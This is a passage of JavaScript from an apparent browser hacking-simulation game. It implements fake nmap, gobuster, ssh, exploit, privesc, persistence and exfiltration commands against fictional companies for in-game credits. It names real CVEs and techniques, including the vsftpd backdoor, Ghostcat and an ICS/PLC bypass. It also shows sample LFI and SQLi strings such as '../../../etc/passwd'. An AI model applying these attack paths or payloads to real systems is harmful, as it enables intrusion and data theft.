+  var hasV=flags.some(function(f){return ['-sv','-a','-sc','-svsc','-svscp'].indexOf(f.toLowerCase())>=0||f==='-sV'||f==='-sC';});
+  var hasC=flags.some(function(f){return f==='-sC'||f==='-A'||f.toLowerCase()==='-a';});
+  tPrint('sys','[*] Nmap scan: '+ip+' ('+co.domain+')...');
+  if(co.sec.ids){tPrint('warn','[!] IDS may detect this scan');riseWanted(0.5);}
+  after(2000,function(){
+    tPrint('pre','Nmap scan report for '+co.domain+' ('+ip+')');
+    tPrint('pre','Host is up (0.021s latency).');tPrint('pre','');
+    tPrint('pre','PORT      STATE  SERVICE'+(hasV?'    VERSION  VULN':''));
+    var vulnCount=0;
+    co.ports.forEach(function(p){
+      tPrint('pre',(p.num+'/tcp').padEnd(10,' ')+'open   '+p.svc.padEnd(8,' ')+(hasV?'  '+p.ver:''));
+      if((hasC||hasV)&&p.vuln&&p.vuln!=='none'&&p.vuln!=='weak-creds'&&p.vuln!=='unauth-elastic'){
+        tPrint('warn','           |_ VULN: '+p.vuln+' -- '+p.note);
+        vulnCount++;
+        // CVE discovery
+        var cveId=CVE_DISC_MAP[p.vuln];
+        if(cveId&&G.discoveredCves.indexOf(cveId)<0){
+          G.discoveredCves.push(cveId);
+          tPrint('ok','           [!] New CVE added to database: '+cveId);
+          toast('\u{1F4A1} CVE discovered: '+cveId);
+        }
+      }
+    });
+    if(hasV){
+      tPrint('pre','');
+      if(co.sec.fw) tPrint('warn','[!] Firewall: filtered packets detected');
+      if(co.sec.ids)tPrint('warn','[!] IDS: signature match active');
+      if(co.sec.waf)tPrint('warn','[!] WAF: web application firewall active');
+      if(co.sec.mfa)tPrint('warn','[!] MFA: multi-factor auth detected on web portals');
+    }
+    if(!G.reconDone[co.id])G.reconDone[co.id]={};
+    var bonus=vulnCount*15;
+    if(bonus>0){
+      if(!G.reconDone[co.id].nmapRewarded){
+        G.reconDone[co.id].nmapRewarded=true;
+        G.credits+=bonus;tPrint('ok','[+] Recon bonus: +\u20BF'+bonus+' ('+vulnCount+' CVEs identified, one-time)');renderTopbar();
+      } else {
+        tPrint('dim','[*] Scan already rewarded for this target.');
+      }
+    } else {
+      tPrint('dim','[*] No exploitable CVEs found -- try nmap -sV -sC for deeper scan.');
+    }
+    tPrint('dim','[*] Use CVE-DB tab or: cve <term> to research vulnerabilities');
+    if(!G.reconDone[co.id])G.reconDone[co.id]={};
+    G.reconDone[co.id].nmap=true;
+    renderNetmap();renderCveDb();checkUnlock();saveGame();
+  });
+}
+
+// ====== GOBUSTER ======
+function cmdGobuster(args){
+  var ip=args.find(function(a){return !a.startsWith('-');});
+  if(!ip){tPrint('err','Usage: gobuster <ip>  |  man gobuster');return;}
+  if(G.tools.indexOf('gobuster')<0){tPrint('err','[!] gobuster not installed. Buy in shop (100c).');return;}
+  var co=COMPANIES.find(function(c){return c.ip===ip||c.domain===ip;});
+  if(!co||G.discovered.indexOf(co.id)<0){tPrint('err','Unknown target. Run scan first.');return;}
+  tPrint('sys','[*] Gobuster on http://'+co.domain+'...');
+  after(2000,function(){
+    var paths={
+      c0:['200  /index.php','200  /login.php','403  /config.php','200  /search.php','200  /api/','200  /api/users.php','302  /admin (redirects to /login.php)'],
+      c1:['200  /portal','301  /admin','200  /api/','200  /upload/','403  /jenkins/','200  /actuator/health'],
+      c2:['200  /index.html','302  /admin (auth required)','200  /api/v1/','403  /config/'],
+      c3:['200  /kibana/','200  /api/v2/','302  /portal','403  /internal/','200  /health'],
+      c4:['200  /home','200  /plans','200  /support','200  /api/tenants','403  /admin'],
+      c5:['200  /hmi/','200  /scada-api/','403  /admin/','200  /status'],
+      c6:['200  /home','200  /careers','403  /contracts','403  /classified/']
+    };
+    tPrint('ok','[+] Found on '+co.domain+':');
+    (paths[co.id]||['200  /index.html']).forEach(function(p){tPrint('dim','    '+p);});
+    if(!G.reconDone[co.id])G.reconDone[co.id]={};
+    G.reconDone[co.id].gobuster=true;
+    if(!G.reconDone[co.id].gobusterRewarded){
+      G.reconDone[co.id].gobusterRewarded=true;
+      G.credits+=20;tPrint('ok','[+] Recon bonus: +\u20BF20 (one-time)');renderTopbar();
+    } else tPrint('dim','[*] Gobuster already run here -- no bonus.');
+    tPrint('dim','[*] Browse discovered paths in Browser pane.');
+    saveGame();
+  });
+}
+
+// ====== DEPLOY ======
+function cmdDeploy(args){
+  var type=args[0],ip=args[1];
+  if(type==='miner'){cmdDeployMiner(ip);return;}
+  if(!type||!ip){tPrint('err','Usage: deploy <sniffer|crawler|miner> <ip>  |  man deploy');return;}
+  var co=COMPANIES.find(function(c){return c.ip===ip||c.id===ip;});
+  if(!co||G.discovered.indexOf(co.id)<0){tPrint('err','Target not discovered.');return;}
+  if(!G.agents[co.id])G.agents[co.id]=[];
+  if(G.agents[co.id].find(function(a){return a.type===type;})){tPrint('warn','[!] '+type+' already deployed on '+co.domain+'.');return;}
+  tPrint('sys','[*] Deploying '+type+' on '+co.domain+'...');
+  after(1500,function(){
+    var creds=Object.entries(co.creds||{}),found=creds[0];
+    var results=type==='sniffer'
+      ?['Capture: '+co.domain+' -- 45min passive','Packets: '+Math.floor(3000+Math.random()*3000),
+        found?'[CRED] '+found[0]+' : '+found[1]:'[INFO] No plaintext credentials found',
+        '[DNS] Internal: db.'+co.domain,'[INFO] Sessions: HTTP/HTTPS traffic logged']
+      :['Crawled: http://'+co.domain,'Tech stack: '+(co.ports||[]).map(function(p){return p.svc;}).join(', '),'Links: /login /api /admin /portal'];
+    G.agents[co.id].push({type:type,deployed:Date.now(),results:results});
+    if(type==='sniffer'){
+      if(!G.reconDone[co.id])G.reconDone[co.id]={};
+      G.reconDone[co.id].sniffer=true;
+      if(!G.reconDone[co.id].snifferRewarded){
+        G.reconDone[co.id].snifferRewarded=true;
+        G.credits+=30;tPrint('ok','[+] Intel bonus: +\u20BF30 (one-time)');renderTopbar();
+      } else tPrint('dim','[*] Sniffer already deployed here -- no bonus.');
+    }
+    tPrint('ok','[+] '+type+' deployed on '+co.domain+'. Run "agents" to view results.');
+    saveGame();renderNetmap();
+  });
+}
+
+function cmdAgents(){
+  var ids=Object.keys(G.agents);
+  if(!ids.length){tPrint('dim','No agents deployed. Use: deploy sniffer <ip>');return;}
+  ids.forEach(function(id){
+    var co=COMPANIES.find(function(c){return c.id===id;});
+    tPrint('hdr','['+(co?co.domain:id)+']');
+    G.agents[id].forEach(function(a){
+      tPrint('ok','  '+a.type.toUpperCase()+' -- deployed '+new Date(a.deployed).toLocaleTimeString());
+      a.results.forEach(function(r){tPrint('dim','    '+r);});
+    });
+  });
+}
+
+
+// ====== SSH / FTP / NC ======
+function cmdSsh(args){
+  var uh=args.find(function(a){return a.includes('@');})||args[0];
+  if(!uh){tPrint('err','Usage: ssh user@<ip>  |  man ssh');return;}
+  var user,ip;
+  if(uh.includes('@')){var sp=uh.split('@');user=sp[0];ip=sp[1];}else{ip=uh;user='root';}
+  var co=COMPANIES.find(function(c){return c.ip===ip;});
+  if(!co){tPrint('err','ssh: '+ip+': No route to host');return;}
+  if(!co.ports.find(function(p){return p.num===22||p.num===2222;})){tPrint('err','ssh: Connection refused (no SSH service)');return;}
+  var recon=G.reconDone[co.id]||{};
+  if(!recon.ping&&!recon.nmap){tPrint('err','ssh: Host unreachable. Run scan first.');return;}
+  var known=co.creds&&co.creds[user],hasPwned=G.pwned[co.id]&&G.pwned[co.id].hasShell;
+  if(!known&&!hasPwned){
+    tPrint('err',user+'@'+ip+': Permission denied (publickey,password)');
+    tPrint('dim','Hint: deploy sniffer '+ip+'  or  brute ssh '+ip);
+    return;
+  }
+  tPrint('sys','[*] ssh '+user+'@'+ip+'...');
+  after(700,function(){
+    tPrint('ok','Connected to '+co.domain+'.');
+    if(!G.pwned[co.id])G.pwned[co.id]={hasShell:false,hasRoot:false,exfilled:[],persisted:false};
+    G.pwned[co.id].hasShell=true;
+    if(user==='root'||user==='Administrator')G.pwned[co.id].hasRoot=true;
+    G.session={connected:true,targetId:co.id,user:user,cwd:'/',isRoot:(user==='root'||user==='Administrator')};
+    if(!G.pwned[co.id]||!G.pwned[co.id].sshRewarded){
+      if(!G.pwned[co.id])G.pwned[co.id]={hasShell:false,hasRoot:false,exfilled:[],persisted:false};
+      G.pwned[co.id].sshRewarded=true;
+      G.credits+=50;tPrint('ok','[+] Access bonus: +\u20BF50 (first login)');renderTopbar();
+    }
+    updatePrompt();renderFS();saveGame();
+    if(co.sec.ids){triggerIDS(co);riseWanted(1);}
+    tPrint('dim','Tip: ls  cd  cat  whoami  privesc linpeas');
+  });
+}
+function cmdFtp(args){
+  var ip=args[0];if(!ip){tPrint('err','Usage: ftp <ip>');return;}
+  var co=COMPANIES.find(function(c){return c.ip===ip;});
+  if(!co||!co.ports.find(function(p){return p.num===21;})){tPrint('err','ftp: Connection refused');return;}
+  after(500,function(){
+    tPrint('ok','220 (vsFTPd 2.3.4)');
+    tPrint('warn','[!] vsftpd 2.3.4 detected -- this version has a known backdoor');
+    tPrint('dim','    Exploit: exploit vsftpd-backdoor '+ip);
+  });
+}
+function cmdNc(args){
+  if(G.tools.indexOf('netcat')<0){tPrint('err','nc: not found');return;}
+  if(args.indexOf('-lvnp')>=0||args.indexOf('-l')>=0){
+    var p=args[args.indexOf('-lvnp')+1]||args[1]||'4444';
+    tPrint('ok','Listening on 0.0.0.0:'+p);tPrint('dim','[Waiting for connection...]');return;
+  }
+  var ip=args[0],port=args[1];
+  if(!ip||!port){tPrint('','usage: nc [-lvnp port] [host] [port]');return;}
+  var co=COMPANIES.find(function(c){return c.ip===ip;});
+  if(co&&port==='6200'&&G.pwned[co.id]&&G.pwned[co.id].backdoor){
+    tPrint('ok','Connection to '+ip+' 6200 succeeded!');tPrint('pre','uid=0(root) gid=0(root)');
+    if(!G.pwned[co.id])G.pwned[co.id]={hasShell:false,hasRoot:false,exfilled:[],persisted:false};
+    G.pwned[co.id].hasShell=true;G.pwned[co.id].hasRoot=true;
+    G.session={connected:true,targetId:co.id,user:'root',cwd:'/',isRoot:true};
+    updatePrompt();renderFS();saveGame();
+  } else tPrint('err','nc: '+ip+': Connection refused');
+}
+
+
+// ====== EXPLOIT ======
+function cmdExploit(args){
+  var vuln=args[0],ip=args[1];
+  if(!vuln||!ip){tPrint('err','Usage: exploit <vuln> <ip>  |  man exploit');tPrint('dim','Example: exploit CVE-2017-7679 192.168.10.14');return;}
+  var webVulns=['sqli','sqli-blind','xss','lfi','csrf','idor'];
+  var isWeb=webVulns.indexOf(vuln.toLowerCase())>=0;
+  if(!isWeb&&G.tools.indexOf('metasploit')<0){tPrint('err','[!] Metasploit required for CVE exploits. Buy in shop (300c).');return;}
+  var co=COMPANIES.find(function(c){return c.ip===ip;});
+  if(!co||G.discovered.indexOf(co.id)<0){tPrint('err','Unknown target. Run scan first.');return;}
+  var recon=G.reconDone[co.id]||{},req=co.scanReq||{};
+  if(!isWeb&&req.nmap&&!recon.nmap){tPrint('err','[!] Recon required: nmap -sV -sC '+ip);return;}
+  if(!isWeb&&req.gobuster&&!recon.gobuster){tPrint('err','[!] Recon required: gobuster '+ip);return;}
+  if(!isWeb&&req.sniffer&&!recon.sniffer){tPrint('err','[!] Recon required: deploy sniffer '+ip);return;}
+  if(co.diff==='elite'&&G.tools.indexOf('tor')<0){tPrint('err','[!] TOR required for elite targets. Buy in shop (3500c).');return;}
+  if(co.sec.ids){triggerIDS(co);riseWanted(1);}
+  if(isWeb){runWebExploit(vuln,co);return;}
+  var port=co.ports.find(function(p){
+    if(!p.vuln||p.vuln==='none')return false;
+    var vl=vuln.toLowerCase(),pl=p.vuln.toLowerCase();
+    return pl===vl||vl.includes(pl.split('-')[0])||pl.includes(vl.split('-')[0]);
+  });
+  if(!port){tPrint('err','[-] No module for "'+vuln+'" on '+ip+'.');tPrint('dim','Run: nmap -sV -sC '+ip+'  to find vulnerabilities.');return;}
+  tPrint('sys','[*] Loading module: '+vuln);tPrint('sys','[*] Target: '+ip+':'+port.num+' ('+port.svc+' '+port.ver+')');
+  after(1200,function(){
+    tPrint('sys','[*] Sending payload...');
+    after(1500,function(){
+      if(co.sec.fw&&G.tools.indexOf('tor')<0&&G.tools.indexOf('vpn-chain')<0&&Math.random()>0.65){
+        tPrint('err','[-] Exploit blocked by firewall.');tPrint('dim','Buy VPN Chain or TOR for evasion.');return;
+      }
+      if(!G.pwned[co.id])G.pwned[co.id]={hasShell:false,hasRoot:false,exfilled:[],persisted:false};
+      var vl=vuln.toLowerCase();
+      if(vl.includes('vsftpd')||vl.includes('backdoor')){
+        tPrint('ok','[+] Backdoor triggered! Bind shell on port 6200.');tPrint('ok','[+] Connect: nc '+ip+' 6200');
+        G.pwned[co.id].backdoor=true;G.pwned[co.id].hasShell=true;G.pwned[co.id].hasRoot=true;
+        G.session={connected:true,targetId:co.id,user:'root',cwd:'/',isRoot:true};
+        G.credits+=150;tPrint('ok','[+] Root shell bonus: +\u20BF150');renderTopbar();
+        updatePrompt();renderFS();saveGame();renderNetmap();
+        tPrint('dim','Root shell active. Next: persist cron  then  exfil /root/flag.txt https');
+      } else if(vl.includes('2020-1938')){
+        tPrint('ok','[+] Ghostcat AJP connected!');tPrint('ok','[+] Reading /opt/tomcat/conf/tomcat-users.xml...');
+        after(600,function(){
+          var content=(co.fc||{})['/opt/tomcat/conf/tomcat-users.xml']||'[file read OK]';
+          content.split('\n').forEach(function(l){tPrint('pre',l);});
+          G.pwned[co.id].hasShell=true;
+          G.session={connected:true,targetId:co.id,user:'tomcat',cwd:'/',isRoot:false};
+          G.credits+=75;tPrint('ok','[+] Shell bonus: +\u20BF75');renderTopbar();
+          updatePrompt();renderFS();saveGame();renderNetmap();
+          tPrint('dim','Shell as tomcat. Next: privesc linpeas');
+        });
+      } else {
+        var shellUser=co.rootMethod&&co.rootMethod.toLowerCase().includes('sudo')?'www-data':'operator';
+        tPrint('ok','[+] Exploit successful! Shell as: '+shellUser);
+        G.pwned[co.id].hasShell=true;
+        G.session={connected:true,targetId:co.id,user:shellUser,cwd:'/',isRoot:false};
+        G.credits+=75;tPrint('ok','[+] Shell bonus: +\u20BF75');renderTopbar();
+        updatePrompt();renderFS();saveGame();renderNetmap();
+        tPrint('dim','Next: privesc linpeas to escalate to root.');
+      }
+    });
+  });
+}
+
+function runWebExploit(vuln,co){
+  var guides={
+    sqli:'[SQLi]\n[*] Testing '+co.domain+'/login.php...\n[+] Auth bypassed via OR injection\n[+] Credential dump: '+Object.keys(co.creds||{})[0]+' extracted\n[!] Use INTERCEPT or FUZZER in browser pane',
+    'sqli-blind':'[Blind SQLi]\n[*] Time-based: AND SLEEP(5)\n[+] Response delayed 5s -- vulnerable!\n[*] Use exploit sqli for faster extraction',
+    xss:'[XSS]\n[*] Testing input fields...\n[+] /search.php reflects input without encoding\n[+] Stored XSS: contact/comment fields also vulnerable\n[!] Use FUZZER in browser pane to auto-test',
+    lfi:'[LFI]\n[*] Testing: /portal?page=../../../etc/passwd\n[+] LFI confirmed -- file contents returned\n[!] Try: /etc/passwd  /var/www/html/config.php  /etc/shadow (root req)',
+    csrf:'[CSRF]\n[*] Checking forms for tokens...\n[+] POST /login -- no CSRF token found!\n[!] Use INTERCEPT to craft cross-origin payload',
+    idor:'[IDOR]\n[*] Testing /api/users.php?id=1 then id=2\n[+] Returns data for any user without auth check\n[!] Browse /api/users in Browser pane'
+  };
+  var g=guides[vuln.toLowerCase()]||'['+vuln+']\n[+] Web exploit on '+co.domain;
+  after(700,function(){
+    g.split('\n').forEach(function(l){
+      if(l.startsWith('[+]'))tPrint('ok',l);
+      else if(l.startsWith('[!]'))tPrint('warn',l);
+      else if(l.startsWith('[*]'))tPrint('sys',l);
+      else tPrint('pre',l);
+    });
+  });
+}
+
+function cmdBrute(args){
+  var svc=args[0],ip=args[1];
+  if(!svc||!ip){tPrint('err','Usage: brute <service> <ip>  |  man brute');return;}
+  if(G.tools.indexOf('hydra')<0){tPrint('err','[!] hydra not installed. Buy in shop (150c).');return;}
+  var co=COMPANIES.find(function(c){return c.ip===ip;});
+  if(!co){tPrint('err','Unknown target.');return;}
+  tPrint('sys','[*] Hydra: '+svc.toUpperCase()+' @ '+ip);
+  tPrint('warn','[!] Brute force is NOISY -- will trigger IDS if active.');
+  if(co.sec.ids){riseWanted(1);triggerIDS(co);}
+  after(2500,function(){
+    var creds=Object.entries(co.creds||[]);
+    if(creds.length)tPrint('ok','[+] '+ip+' -- login: '+creds[0][0]+'  password: '+creds[0][1]);
+    else tPrint('err','[-] No credentials found in wordlist.');
+  });
+}
+
+
+// ====== FILESYSTEM ======
+function normPath(cwd,rel){
+  if(!rel||rel==='.')return cwd;
+  if(rel==='..')return cwd.lastIndexOf('/')>0?cwd.substring(0,cwd.lastIndexOf('/')):'/';
+  if(rel.startsWith('/'))return rel.replace(/\/+/g,'/').replace(/\/$/,'')||'/';
+  return (cwd==='/'?'':cwd)+'/'+rel;
+}
+function cmdLs(args,s,t){
+  if(!s.connected||!t){
+    // Local filesystem listing
+    var path=args[0]||'~';
+    var entries;
+    if(path==='exfil/'||path==='exfil'){
+      entries=Object.values(G.pwned).reduce(function(a,pw){return a.concat(pw.exfilled||[]);},[]);
+    } else {
+      var localDirs={'~':['walkthrough.txt','walkthrough-web.txt','walkthrough-opsec.txt','walkthrough-mining.txt','tools.txt','exploits.txt','exfil/','scripts/'].concat(COMPANIES.map(function(co,i){return 'walkthrough-target-'+(i+1)+'.txt';}))};
+      entries=localDirs[path]||null;
+    }
+    if(!entries){tPrint('err','ls: '+path+': No such file or directory');return;}
+    entries.forEach(function(e){var isDir=e.endsWith('/');tPrint(isDir?'dir':'fil',(isDir?'drwxr-xr-x':'  -rw-r--r--')+'  '+e);});
+    return;
+  }
+  var path=normPath(s.cwd,args[0]||'.');
+  var entries=t.fs[path];
+  if(entries===undefined){tPrint('err','ls: '+(args[0]||'.')+': No such file or directory');return;}
+  if(!entries.length){tPrint('dim','(empty directory)');return;}
+  entries.forEach(function(e){
+    var fp=(path==='/'?'/':path+'/')+e;
+    var isDir=!!t.fs[fp];
+    var isKey=e.endsWith('id_rsa')||e.endsWith('.key')||e.endsWith('.pem');
+    var isLocked=(fp.startsWith('/root')||fp.includes('Administrator'))&&!s.isRoot;
+    var cls=isLocked?'dim':isKey?'keyf':isDir?'dir':e.match(/\.(sh|py)$/)?'exe':'fil';
+    tPrint(cls,(isDir?'d':'-')+'rwxr-xr-x  '+e+(isDir?'/':'')+(isKey?' [KEY]':'')+(isLocked?' [LOCKED]':''));
+  });
+}
+function cmdCd(args,s,t){
+  if(!s.connected||!t){
+    var dest=args[0]||'~';
+    if(dest==='~'||dest==='/'||dest==='.'){tPrint('dim','bash: cd: '+dest+': local shell has no target filesystem');return;}
+    tPrint('err','bash: cd: '+dest+': not connected to target (use ssh first)');return;
+  }
+  var dest=args[0]||'/';var path=normPath(s.cwd,dest);
+  if(!t.fs[path]){tPrint('err','-bash: cd: '+dest+': No such file or directory');return;}
+  if((path.startsWith('/root')||path.includes('Administrator'))&&!s.isRoot){tPrint('err','cd: '+dest+': Permission denied');tPrint('dim','Run privesc first.');return;}
+  G.session.cwd=path;updatePrompt();renderFS();
+}
+function cmdCat(args,s,t){
+  var f=args[0];if(!f){tPrint('err','Usage: cat <file>');return;}
+  // Per-target walkthrough files — gated behind discovery
+  var tMatch=f.match(/^walkthrough-target-(\d+)\.txt$/);
+  if(tMatch){
+    var tIdx=parseInt(tMatch[1])-1;
+    var co=COMPANIES[tIdx];
+    if(!co){tPrint('err','cat: '+f+': No such file');return;}
+    if(G.discovered.indexOf(co.id)<0){tPrint('warn','[!] Target not yet discovered (requires '+co.repReq+' REP)\n    Earn REP by completing contracts on unlocked targets.');return;}
+    tPrint('hdr','TARGET '+(tIdx+1)+': '+co.name+' -- '+co.diff.toUpperCase()+' -- '+co.repReq+' REP');
+    tPrint('pre','IP: '+co.ip+'  Domain: '+co.domain);
+    tPrint('pre','Industry: '+co.industry);tPrint('pre','');
+    tPrint('pre','Security: FW='+(co.sec.fw?'YES':'no')+' IDS='+(co.sec.ids?'YES':'no')+' WAF='+(co.sec.waf?'YES':'no')+' MFA='+(co.sec.mfa?'YES':'no'));
+    tPrint('pre','Recon gates: nmap='+(co.scanReq.nmap?'required':'free')+' gobuster='+(co.scanReq.gobuster?'required':'free')+' sniffer='+(co.scanReq.sniffer?'required':'free'));
+    tPrint('pre','');tPrint('sys','OPEN PORTS:');
+    co.ports.forEach(function(p){tPrint('pre','  '+p.num+'/tcp  '+p.svc.padEnd(8,' ')+' '+p.ver+(p.vuln&&p.vuln!=='none'?' ['+p.vuln+']':''));});
+    tPrint('pre','');tPrint('sys','ATTACK PATH:');
+    tPrint('pre','  $ scan '+co.ip.split('.').slice(0,3).join('.')+'.0/24');
+    tPrint('pre','  $ nmap -sV -sC '+co.ip);
+    if(co.scanReq.sniffer)tPrint('pre','  $ deploy sniffer '+co.ip);
+    if(co.scanReq.gobuster)tPrint('pre','  $ gobuster '+co.ip);
+    tPrint('pre','  $ exploit [CVE] '+co.ip);
+    tPrint('pre','  $ privesc linpeas');
+    tPrint('pre','  $ exfil /root/flag.txt https');
+    tPrint('pre','  $ deploy miner '+co.ip);
+    tPrint('pre','');tPrint('sys','CONTRACTS:');
+    (co.contracts||[]).forEach(function(ct){
+      var st=G.contracts[ct.id]||'inactive';
+      tPrint(st==='complete'?'ok':'dim','  ['+(st==='complete'?'DONE':'TODO')+'] '+ct.title+' \u2014 \u20BF'+ct.reward.c+' +'+ct.reward.r+' REP');
+      tPrint('pre','         exfil '+ct.target+' https');
+    });
+    return;
+  }
+  if(VFILES[f]){VFILES[f].split('\n').forEach(function(l){tPrint('pre',l);});return;}
+  if(f==='tools.txt'){printToolsTxt();return;}
+  if(f==='exploits.txt'){printExploitsTxt();return;}
+  if(!s||!s.connected||!t){tPrint('err','cat: '+f+': No such file (not connected to target)');tPrint('dim','Virtual files: cat walkthrough.txt  cat tools.txt  cat exploits.txt');return;}
+  var fp=normPath(s.cwd,f);
+  if((fp.startsWith('/root')||fp.includes('Administrator'))&&!s.isRoot){tPrint('err','cat: '+f+': Permission denied');tPrint('dim','Hint: privesc first.');return;}
+  if(fp.endsWith('shadow')&&!s.isRoot){tPrint('err','cat: '+f+': Permission denied');return;}
+  var content=(t.fc||{})[fp];
+  if(content!==undefined){content.split('\n').forEach(function(l){tPrint('pre',l);});return;}
+  var dir=fp.substring(0,fp.lastIndexOf('/')||1),base=fp.substring(fp.lastIndexOf('/')+1);
+  if((t.fs[dir]||[]).indexOf(base)>=0){
+    // Try to display script files with placeholder content
+    if(base.endsWith('.sh')||base.endsWith('.py')){
+      tPrint('pre','#!/bin/bash');
+      tPrint('pre','# '+base+' -- target script (read-only)');
+      tPrint('pre','# Use: exfil '+fp+' https  to exfiltrate');
+    } else {
+      tPrint('dim','[Binary or unreadable file]');
+    }
+    return;
+  }
+  tPrint('err','cat: '+f+': No such file or directory');
+}
+function printToolsTxt(){
+  tPrint('hdr','INSTALLED TOOLS & COMMANDS');tPrint('pre','');
+  G.tools.forEach(function(id){
+    var item=SHOP.find(function(s){return s.id===id;});if(!item)return;
+    tPrint('ok','['+item.name+']');tPrint('dim','  '+item.desc);
+    item.cmds.forEach(function(c){tPrint('sys','  $ '+c);});tPrint('pre','');
+  });
+  tPrint('dim','Buy more tools in shop. Type: shop');
+}
+function printExploitsTxt(){
+  tPrint('hdr','EXPLOIT QUICK REFERENCE');
+  tPrint('sys','NETWORK (requires metasploit)');
+  ['CVE-2017-7679 <ip>   Apache mod_mime RCE -> www-data',
+   'CVE-2020-1938 <ip>   Ghostcat AJP file read/RCE -> shell',
+   'CVE-2021-22144 <ip>  Kibana SSRF -> pivot to internal ES',
+   'CVE-2022-1388 <ip>   F5 BIG-IP auth bypass -> root',
+   'vsftpd-backdoor <ip> vsftpd 2.3.4 -> instant root on port 6200',
+   'S7-auth-bypass <ip>  Siemens S7comm -> PLC + HMI access (metasploit-pro)'].forEach(function(l){tPrint('dim','  exploit '+l);});
+  tPrint('sys','WEB APP');
+  ['sqli <ip>   SQL injection auth bypass + cred dump',
+   'xss <ip>    Stored/reflected XSS payload injection',
+   'lfi <ip>    Local file inclusion path traversal',
+   'csrf <ip>   Cross-site request forgery check',
+   'idor <ip>   Insecure direct object reference enumeration'].forEach(function(l){tPrint('dim','  exploit '+l);});
+  tPrint('sys','PRIVESC (after shell)');
+  ['linpeas   Auto-scan for sudo/SUID/cron vectors',
+   'sudo      NOPASSWD sudo to /bin/bash',
+   'suid      SUID binary exploitation',
+   'cron      Writable cron job injection',
+   'token     Windows SeImpersonatePrivilege -> SYSTEM (needs metasploit-pro)',
+   'hmi-admin HMI admin panel -> root (CivicGrid)'].forEach(function(l){tPrint('dim','  privesc '+l);});
+}
+
+
+// ====== POST-EXPLOITATION ======
+function cmdPrivesc(args,s,t){
+  if(!s.connected||!t){tPrint('err','Not connected to target. SSH first.');return;}
+  if(s.isRoot){tPrint('ok','[+] Already root. uid=0(root)');return;}
+  var method=args[0]||'linpeas';
+  if(method==='linpeas'&&G.tools.indexOf('linpeas')<0&&G.tools.indexOf('metasploit-pro')<0){
+    tPrint('err','[!] linPEAS required. Buy in shop (400c). Or: metasploit-pro (2500c).');return;
+  }
+  if(method==='token'&&G.tools.indexOf('metasploit-pro')<0){tPrint('err','[!] Metasploit Pro required for token impersonation (2500c).');return;}
+  tPrint('sys','[*] Running privesc: '+method+'...');
+  after(2000,function(){
+    tPrint('pre','[privesc] '+t.rootMethod);
+    after(700,function(){
+      tPrint('ok','[+] Privilege escalation successful!');tPrint('ok','[+] uid=0(root) gid=0(root) groups=0(root)');
+      G.session.user='root';G.session.isRoot=true;
+      if(!G.pwned[t.id])G.pwned[t.id]={hasShell:false,hasRoot:false,exfilled:[],persisted:false};
+      G.pwned[t.id].hasRoot=true;
+      G.credits+=100;tPrint('ok','[+] Privesc bonus: +\u20BF100');renderTopbar();
+      updatePrompt();renderFS();saveGame();renderNetmap();
+      tPrint('dim','Next: persist cron  then  exfil /root/flag.txt https  then  deploy miner '+t.ip);
+    });
+  });
+}
+function cmdPersist(args,s,t){
+  if(!s.connected||!t){tPrint('err','Not connected.');return;}
+  if(!s.isRoot){tPrint('err','[!] Root required. Run privesc first.');return;}
+  var method=args[0]||'cron';
+  tPrint('sys','[*] Installing persistence ('+method+')...');
+  after(900,function(){
+    if(!G.pwned[t.id])G.pwned[t.id]={hasShell:false,hasRoot:false,exfilled:[],persisted:false};
+    G.pwned[t.id].persisted=true;
+    tPrint('ok','[+] Persistence installed via '+method+'. Survives reboot.');
+    saveGame();renderNetmap();
+  });
+}
+function cmdExfil(args,s,t){
+  if(!s.connected||!t){tPrint('err','Not connected. SSH to target first.');return;}
+  var fp=args[0],method=args[1]||'https';
+  if(!fp){tPrint('err','Usage: exfil <path> [https|dns|http]  |  man exfil');return;}
+  var full=normPath(s.cwd,fp);
+  if((full.startsWith('/root')||full.includes('Administrator'))&&!s.isRoot){tPrint('err','[!] Root required to exfil protected paths. Run privesc first.');return;}
+  if(method==='http'&&t.sec.ids){riseWanted(1);tPrint('warn','[!] HTTP exfil detected by IDS! Use https or dns.');}
+  var dir=full.substring(0,full.lastIndexOf('/')||1),base=full.substring(full.lastIndexOf('/')+1);
+  var hasFile=(t.fc&&t.fc[full]!==undefined)||((t.fs[dir]||[]).indexOf(base)>=0);
+  if(!hasFile){tPrint('err','exfil: '+fp+': File not found on target');return;}
+  tPrint('sys','[*] Exfiltrating '+full+' via '+method.toUpperCase()+'...');
+  after(1200,function(){
+    tPrint('ok','[+] Transfer complete: '+base+' \u2192 local/exfil/'+base);
+    if(!G.pwned[t.id])G.pwned[t.id]={hasShell:false,hasRoot:false,exfilled:[],persisted:false};
+    if(!G.pwned[t.id].exfilled)G.pwned[t.id].exfilled=[];
+    if(G.pwned[t.id].exfilled.indexOf(full)<0)G.pwned[t.id].exfilled.push(full);
+    checkContracts(t,full);saveGame();renderFS();
+  });
+}
+function cmdCurl(args){
+  var url=args[0];if(!url){tPrint('err','Usage: curl <url>  |  man curl');return;}
+  var co=COMPANIES.find(function(c){return url.includes(c.domain)||url.includes(c.ip);});
+  tPrint('sys','[*] GET '+url);
+  after(500,function(){
+    if(!co){tPrint('err','curl: (6) Could not resolve host');return;}
+    tPrint('pre','HTTP/1.1 200 OK\nServer: Apache/2.2.34\nContent-Type: text/html');
+    tPrint('pre','[Response body -- use Browser pane for full render]');
+    if(!G.reconDone[co.id])G.reconDone[co.id]={};G.reconDone[co.id].curl=true;
+    if(url.includes('../')||url.includes('%2F..%2F'))tPrint('warn','[!] Directory traversal -- LFI possible. Try: exploit lfi '+co.ip);
+  });
+}
+function cmdContracts(){
+  tPrint('hdr','ACTIVE CONTRACTS');
+  var any=false;
+  COMPANIES.forEach(function(co){
+    (co.contracts||[]).forEach(function(ct){
+      var st=G.contracts[ct.id];if(st==='inactive')return;
+      any=true;
+      tPrint(st==='complete'?'ok':'warn','  ['+(st==='complete'?'\u2713':'\u25CF')+'] '+co.name+': '+ct.title);
+      tPrint('dim','       '+ct.desc);
+      tPrint('dim','       Reward: \u20BF'+ct.reward.c+' + '+ct.reward.r+' REP'+(st==='complete'?' [COMPLETE]':''));
+    });
+  });
+  if(!any)tPrint('dim','No active contracts. Earn REP to unlock more targets.');
+}
+function cmdDisc(){
+  if(!G.session.connected){tPrint('dim','Not connected to a target.');return;}
+  var old=G.session.targetId;
+  G.session={connected:false,targetId:null,user:null,cwd:'/',isRoot:false};
+  updatePrompt();renderFS();
+  tPrint('ok','Connection closed.'+( old?' Disconnected from '+old+'.':''));
+}
+function cmdCve(args){
+  var q=args.join(' ').toLowerCase();
